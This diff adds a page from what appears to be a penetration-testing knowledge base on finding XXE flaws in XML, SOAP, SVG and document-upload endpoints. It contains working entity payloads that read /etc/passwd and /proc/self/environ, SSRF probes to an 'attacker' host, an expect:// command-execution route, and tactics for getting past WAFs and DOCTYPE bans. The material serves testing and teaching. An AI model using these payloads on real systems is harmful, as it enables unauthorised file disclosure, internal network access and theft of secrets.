@@ -1,0 +1,348 @@
+---
+title: Identifying
+description: Where XML reaches a parser - SOAP and REST XML endpoints, content-negotiation pivots from JSON to XML, document-format uploads (SVG, DOCX), and the reflection-based proof of entity resolution that confirms exploitability.
+mitre: [T1190, T1083]
+d3fend: [D3-IAA]
+impact: [DataExfil]
+owasp: [A05]
+sidebar:
+  order: 2
+  label: Identifying
+---
+
+## TL;DR
+
+Three-step identification: find an XML input surface, confirm the parser resolves entities, then test external-entity resolution. The proof-of-life probe is a benign internal entity reflected in the response:
+
+```
+# Step 1 - Spot XML by Content-Type, request body, or document-format upload
+
+# Step 2 - Reflection probe (does the parser resolve entities at all?)
+<!DOCTYPE foo [<!ENTITY test "PROOF_OF_LIFE">]>
+<root><name>&test;</name></root>
+# → If response contains "PROOF_OF_LIFE" where the entity was, internal entities resolve
+
+# Step 3 - External-entity probe
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+<root><name>&xxe;</name></root>
+# → If response contains the hostname, XXE is fully exploitable
+
+# Step 4 - Content-Type pivot for JSON-by-default APIs
+curl -X POST -H 'Content-Type: application/xml' --data '<...>' http://target/api
+```
+
+Success indicator: a value you put in an entity declaration appears in the rendered response. Once that happens, file disclosure is straightforward.
+
+## Finding the XML surface
+
+### Direct indicators
+
+Watch for these in HTTP traffic:
+
+| Indicator | Where |
+| --- | --- |
+| `Content-Type: application/xml` | Request or response header |
+| `Content-Type: text/xml` | Older convention; same meaning |
+| `Content-Type: application/soap+xml` | SOAP API |
+| `SOAPAction:` header | SOAP API |
+| `<?xml version="1.0" ...?>` | First bytes of request/response body |
+| `xmlns=` attributes | XML namespace declarations in body |
+| `multipart/related` with XML parts | SOAP-with-attachments, SAML, WSDL responses |
+
+### File-upload XML surfaces
+
+Many file formats are XML under the hood:
+
+| Format | Notes |
+| --- | --- |
+| **SVG** | Pure XML; any image-processing pipeline that "renders" SVG server-side parses it as XML |
+| **XML Office formats** (`.docx`, `.xlsx`, `.pptx`) | ZIP archives containing `word/document.xml`, `xl/workbook.xml`, etc. Server-side text extractors and converters often parse these |
+| **ODF formats** (`.odt`, `.ods`, `.odp`) | Same - ZIP of XML |
+| **EPUB** | ZIP of XML |
+| **XML-based subtitle formats** (`.ttml`, `.dfxp`) | Subtitle processors |
+| **GPX, KML** | GPS / map data formats |
+| **PDF metadata / XMP** | PDF embeds XML metadata; some PDF parsers eval it |
+
+The SVG upload case is the highest-yield because SVG uploads are commonly accepted (profile pictures, document logos) and many imagemagick / librsvg / batik pipelines historically parsed XML with external entities enabled. See [Limited uploads](/codex/web/uploads/limited-uploads/) for the upload-side details.
+
+### JSON-to-XML content-negotiation pivot
+
+Many "JSON APIs" accept XML as well, depending on the framework. The pattern:
+
+```
+Server reads Content-Type → decides how to parse body
+```
+
+If the framework supports content negotiation (Spring, ASP.NET, some Flask configs, some Express plugins), sending the same logical request body but with `Content-Type: application/xml` may switch the parser. Try:
+
+```shell
+# Original JSON request
+$ curl -X POST -H 'Content-Type: application/json' \
+       -d '{"id": 1, "name": "test"}' \
+       http://target/api/items
+
+# Same logical content, XML-encoded
+$ curl -X POST -H 'Content-Type: application/xml' \
+       --data-binary @- http://target/api/items <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<request>
+  <id>1</id>
+  <name>test</name>
+</request>
+EOF
+```
+
+A 200 response (or any non-415-Unsupported-Media-Type) means the server is processing the XML body. Now the XXE probe applies.
+
+Online converters like `json-to-xml` or `jq -r` with a small wrapper can turn complex JSON bodies into XML quickly for testing.
+
+### GraphQL-to-XML
+
+Some GraphQL endpoints support XML responses or XML mutation bodies via custom transports. Rare but worth probing if the engagement features a GraphQL endpoint that's otherwise well-defended.
+
+### Hidden XML inside document submissions
+
+A common pattern: a form accepts user input via JSON, but one field is "advanced settings as XML" that the back-end concatenates into a larger XML document and parses. Look for fields named `metadata`, `config`, `xml`, `settings`, `advanced`, or any free-form text field that gets stored alongside structured fields.
+
+## The reflection probe - step 1
+
+Before testing external entities (which may be partially defended), confirm the parser resolves *internal* entities. This tests "does the XML parser process entity declarations at all":
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY test "PROOF_OF_LIFE">
+]>
+<root>
+  <name>&test;</name>
+  <email>baseline@example.com</email>
+</root>
+```
+
+Three possible responses:
+
+1. **Response contains "PROOF_OF_LIFE" where `&test;` was.** The parser resolves entities. Move to step 2.
+2. **Response contains the literal string `&test;`.** Entity resolution disabled at the application layer (the XML was treated as text). XXE probably won't work here.
+3. **Error / 500 / parse error.** The DTD or entity declaration tripped strict-XML mode. Try variations:
+   - Move the entity into the existing DOCTYPE if there is one
+   - Use a different XML version or encoding declaration
+   - Try without the `<?xml ...?>` declaration
+
+The "PROOF_OF_LIFE" string can be anything - pick something obviously not in the app's normal data so search-and-confirm is easy.
+
+### Finding which field reflects
+
+In a multi-field XML body, the entity reference has to go in a field that the application *reads and renders back*. Some fields are written to DB only and never echoed; those don't help for response-reflection XXE.
+
+Strategy: send a baseline request and note which submitted values appear in the response. The fields that come back are candidate injection points. Often:
+
+- `name`, `title`, `subject` - usually reflected (forms common, contact pages)
+- `email`, `phone` - usually reflected (form validation echo)
+- `message`, `body`, `notes` - sometimes reflected (preview functionality)
+- `id`, `uuid` - sometimes reflected (success message confirms ID)
+
+If no field reflects, see [Blind exfil](/codex/web/xxe/blind-exfil/) for the OOB approach.
+
+## The external-entity probe - step 2
+
+Once entity resolution is confirmed, test if external entities work:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<root>
+  <name>&xxe;</name>
+</root>
+```
+
+Targets to probe in order (each tests a different parser capability):
+
+| Probe | Tests |
+| --- | --- |
+| `file:///etc/hostname` | Local file read on Linux; tiny, low-noise |
+| `file:///c:/windows/win.ini` | Local file read on Windows |
+| `http://attacker:8000/` | Outbound HTTP (proves SSRF) |
+| `http://127.0.0.1:80/` | Localhost HTTP (also SSRF; sometimes only this works due to egress controls) |
+| `php://filter/convert.base64-encode/resource=/etc/passwd` | PHP-specific filter (only works on PHP) |
+| `expect://id` | PHP `expect://` (rare; if works → RCE) |
+
+For each, observe whether the entity content appears in the response. The minimum useful confirmation is one file read.
+
+### What "file read" responses look like
+
+For `file:///etc/passwd`:
+
+```
+<message>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...</message>
+```
+
+The full file content appears where the entity was referenced. If only part appears, the parser may be truncating at special characters (XML doesn't allow certain bytes in entity content). See [File disclosure](/codex/web/xxe/file-disclosure/) for the workarounds (CDATA, `php://filter/convert.base64-encode/`).
+
+### What "parser blocked" responses look like
+
+| Symptom | Likely cause |
+| --- | --- |
+| Response empty where entity was | Parser resolved entity to `null` (file not readable, or external entities disabled) |
+| 500 Internal Server Error | Parser error - could be permissions, missing file, or strict-XML rejecting the DOCTYPE |
+| Response unchanged (entity name appears verbatim) | Parser doesn't resolve entities at all, or app strips DOCTYPE before parsing |
+| 400 / 415 | Application rejects the body - wrong Content-Type, schema validation, etc. |
+
+For 500 errors, *include* the probe even if you get errors - the error message itself sometimes leaks useful information (file paths, parser library names, stack traces). See [Blind exfil](/codex/web/xxe/blind-exfil/) for error-based exploitation.
+
+## A worked identification walkthrough
+
+A "Contact Us" form submits this XML:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+  <name>John</name>
+  <tel>555-1234</tel>
+  <email>john@example.com</email>
+  <message>Hello</message>
+</root>
+```
+
+Response:
+
+```html
+<h2>Thanks John, we received your message</h2>
+<p>We'll reply to john@example.com soon.</p>
+```
+
+Observations:
+
+- `<name>` is reflected as "John" → injection point candidate 1
+- `<email>` is reflected → injection point candidate 2
+- `<tel>` and `<message>` don't seem to appear in the visible response - could be DB-only
+
+### Step 1 - Reflection probe on `<name>`
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY test "PROOF_OF_LIFE">
+]>
+<root>
+  <name>&test;</name>
+  <tel>555-1234</tel>
+  <email>john@example.com</email>
+  <message>Hello</message>
+</root>
+```
+
+Response:
+
+```html
+<h2>Thanks PROOF_OF_LIFE, we received your message</h2>
+```
+
+✓ Internal entities resolve. Move to external.
+
+### Step 2 - External-entity probe
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<root>
+  <name>&xxe;</name>
+  <tel>555-1234</tel>
+  <email>john@example.com</email>
+  <message>Hello</message>
+</root>
+```
+
+Response:
+
+```html
+<h2>Thanks web-server-prod-01, we received your message</h2>
+```
+
+✓ External entities resolve. XXE is confirmed. Move on to [File disclosure](/codex/web/xxe/file-disclosure/).
+
+## Edge cases
+
+### XML response, plain-text request
+
+Some APIs accept JSON requests but return XML responses. The response is server-generated and not an attack surface. The request body is what matters - if it accepts XML, you're in.
+
+### DTD-not-permitted strictness
+
+Some parsers reject any DOCTYPE in the input as a defense ("DOCTYPE declarations not allowed"). Two paths:
+
+1. **No DOCTYPE** - try declaring entities inline if the parser supports it (rare).
+2. **Find a different XML parser** - if there's an alternate endpoint (e.g., a `/v1/` vs `/v2/` of the API, or a different content-type that routes to a different parser), one of them may have looser config.
+
+### XInclude
+
+XInclude is a separate XML feature (`<xi:include href="..."/>`) that imports another XML file's content into the current document. When DOCTYPE is rejected but XInclude isn't:
+
+```xml
+<?xml version="1.0"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <name><xi:include href="file:///etc/passwd" parse="text"/></name>
+</root>
+```
+
+Achieves the same file-read primitive without needing an entity declaration. Worth trying when DOCTYPE is blocked.
+
+### SOAP-wrapped XML
+
+SOAP envelopes have their own structure but the XXE inside the body works the same:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <getUser>
+      <username>&xxe;</username>
+    </getUser>
+  </soap:Body>
+</soap:Envelope>
+```
+
+The DOCTYPE goes outside the SOAP envelope. The entity is referenced inside it. Most SOAP parsers honor entities the same way as raw XML parsers.
+
+### XML schema validation (XSD) as defense
+
+Some apps validate input XML against a schema (XSD). The schema can restrict which elements are allowed, which might block your DOCTYPE addition. Bypasses:
+
+1. **Submit XSD-conforming structure** but add entities - the schema validates structure, not entity *use*. Add `<!ENTITY xxe ...>` and reference it where the schema allows string content.
+2. **Look for alternate endpoints** without schema validation - admin APIs and legacy endpoints often lack it.
+
+## Defensive smells to ignore (or test anyway)
+
+When the app looks "defended," test these specific patterns to find weaknesses:
+
+| Apparent defense | Why it may not work |
+| --- | --- |
+| `Content-Type: application/json` enforced | Try `application/xml`, `text/xml`, multipart with XML part |
+| "XXE prevention header" / WAF | Look for path variations (`/api/v1/` vs `/api/v2/`); WAFs commonly rate-limit by path |
+| DOCTYPE not allowed | Try XInclude; try DTD via parameter entity from external |
+| External entities disabled at parser | But parameter entities sometimes still work; see blind-exfil |
+| Application converts XML to JSON server-side | The conversion step itself often parses XML - XXE happens before the conversion |
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Spot XML surface | `Content-Type: application/xml`/`text/xml`/`soap+xml`; `<?xml ...?>` in body |
+| Pivot from JSON | `-H 'Content-Type: application/xml'` with XML-converted body |
+| Reflection probe | `<!DOCTYPE root [<!ENTITY test "PROOF">]> ... &test;` |
+| External-entity probe | `<!ENTITY xxe SYSTEM "file:///etc/hostname"> ... &xxe;` |
+| Linux file targets | `/etc/hostname`, `/etc/passwd`, `/etc/hosts`, `/proc/self/environ` |
+| Windows file targets | `c:/windows/win.ini`, `c:/boot.ini`, `c:/inetpub/logs/...` |
+| HTTP outbound probe | `<!ENTITY x SYSTEM "http://attacker:8000/">` |
+| PHP filter probe | `<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">` |
+| XInclude (DOCTYPE blocked) | `<xi:include href="file:///..." parse="text"/>` (with `xmlns:xi="http://www.w3.org/2001/XInclude"`) |
+| SOAP-wrapped XXE | DOCTYPE outside `<soap:Envelope>`; reference entity inside |
+| Document-format pivot | Upload SVG / DOCX / XLSX with embedded XXE payload |
+| If no reflection | See [Blind exfil](/codex/web/xxe/blind-exfil/) for OOB exfil |
